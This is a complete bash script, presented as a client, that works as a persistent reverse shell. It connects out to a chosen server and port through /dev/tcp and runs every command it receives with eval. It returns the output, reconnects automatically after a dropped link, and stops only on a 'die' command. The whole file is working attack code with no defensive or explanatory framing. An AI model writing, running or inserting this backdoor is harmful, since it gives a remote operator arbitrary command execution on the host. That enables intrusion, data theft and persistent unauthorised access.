#!/bin/bash

# Usage: ./client.sh -s <server_ip> -p <server_port>

# Default reconnect delay
RECONNECT_DELAY=5

# Function to display usage information
usage() {
    echo "Usage: $0 -s <server_ip> -p <server_port>"
    exit 1
}

# Parse arguments
while getopts ":s:p:" opt; do
    case $opt in
        s) SERVER=$OPTARG ;;
        p) PORT=$OPTARG ;;
        *) usage ;;
    esac
done

# Ensure that both server and port arguments are provided
if [ -z "$SERVER" ] || [ -z "$PORT" ]; then
    usage
fi

# Main loop
while true; do
    # Create a TCP connection to the server
    exec 3<>/dev/tcp/$SERVER/$PORT
    if [ $? -ne 0 ]; then
        echo "[-] Connection failed"
        sleep $RECONNECT_DELAY
        continue
    fi

    echo "[+] Connected to $SERVER:$PORT"

    # Keep the connection open and listen for commands
    while true; do
        # Read the command from the server
        command=""
        while read -r -t 1 line; do
            command="$command$line"
        done <&3

        # If the command is empty, continue to the next loop iteration
        if [ -z "$command" ]; then
            continue
        fi

        echo "[*] Received command: $command"

        # If the 'die' command is received, exit
        if [ "$command" == "die" ]; then
            echo "[!] Received kill-session command. Shutting down..."
            break 2
        fi

        # Execute the command and capture the output
        output=$(eval "$command" 2>&1)

        # Send the output back to the server, appending EOF marker
        echo -e "$output" >&3
        echo "EOF" >&3
    done

    # Close the connection if the loop exits
    echo "[*] Connection closed"
    exec 3<&-
    exec 3>&-

    echo "[*] Reconnecting in $RECONNECT_DELAY seconds..."
    sleep $RECONNECT_DELAY
done
